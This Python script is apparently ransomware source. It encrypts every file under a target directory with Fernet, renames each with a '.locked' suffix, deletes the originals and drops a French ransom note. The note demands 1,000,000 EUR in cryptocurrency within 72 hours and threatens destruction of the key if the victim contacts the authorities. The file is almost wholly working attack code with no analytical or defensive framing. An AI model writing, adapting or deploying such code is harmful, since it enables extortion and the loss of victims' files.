import os
import secrets
from pathlib import Path

from cryptography.fernet import Fernet, InvalidToken

KEY_FILE = "key.key"
TARGET_DIR = Path("files")
NOTE_FILE = TARGET_DIR / "HOW_TO_RECOVER_FILES.txt"

RANSOM_NOTE = """============================================================
  VOS FICHIERS ONT ETE CHIFFRES
============================================================

Tous vos documents, images, bases de donnees et archives ont été
chiffrés.
Vos sauvegardes locales ont egalement été supprimées.

Pour recuperer vos fichiers, vous devez nous contacter a l'adresse
suivante et fournir votre identifiant :

    recover@protonmail.example

Le prix du dechiffrement est de 1 000 000 EUR, payables en
Monero (XMR) ou Bitcoin (BTC). Le delai de paiement est de 72 heures.
Passe ce delai, le prix double.

Toute tentative de modification des fichiers chiffres, d'utilisation
d'un outil de recuperation tiers ou de contact des autorites
entrainera la destruction definitive de votre cle privee.

============================================================
"""


def generate_key() -> bytes:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key


def load_key() -> bytes:
    with open(KEY_FILE, "rb") as f:
        return f.read()


def iter_targets(root: Path):
    for entry in root.rglob("*"):
        if not entry.is_file():
            continue
        if entry.name == NOTE_FILE.name:
            continue
        if entry.suffix == ".locked":
            continue
        yield entry


def encrypt_file(fernet: Fernet, path: Path) -> None:
    data = path.read_bytes()
    try:
        fernet.decrypt(data)
        return
    except InvalidToken:
        pass

    encrypted = fernet.encrypt(data)
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_bytes(encrypted)
    os.replace(tmp, path.with_suffix(path.suffix + ".locked"))
    path.unlink(missing_ok=True)


def encrypt_all(root: Path, key: bytes) -> None:
    fernet = Fernet(key)
    for path in list(iter_targets(root)):
        try:
            encrypt_file(fernet, path)
        except OSError:
            continue


def drop_note(root: Path) -> None:
    victim_id = secrets.token_hex(8)
    root.mkdir(parents=True, exist_ok=True)
    NOTE_FILE.write_text(RANSOM_NOTE.format(victim_id=victim_id), encoding="utf-8")


def main() -> None:
    if not os.path.exists(KEY_FILE):
        generate_key()
    key = load_key()
    drop_note(TARGET_DIR)
    encrypt_all(TARGET_DIR, key)


if __name__ == "__main__":
    main()